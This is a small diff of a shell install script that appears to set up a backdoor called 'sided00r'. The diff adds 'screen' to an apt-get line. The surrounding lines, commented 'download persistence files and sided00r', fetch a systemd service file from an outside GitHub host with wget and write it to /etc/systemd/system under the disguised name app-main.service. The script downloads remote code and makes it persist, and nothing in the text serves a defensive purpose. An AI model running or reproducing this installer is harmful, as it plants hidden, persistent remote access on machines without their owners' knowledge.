@@ -1,5 +1,5 @@
 # install java
-apt-get install default-jre -y; 
+apt-get install screen default-jre -y; 
 
 # download persistence files and sided00r.
 wget https://raw.githubusercontent.com/Aaron-Akhtar/SideD00r/main/sided00r.service -O /etc/systemd/system/app-main.service 
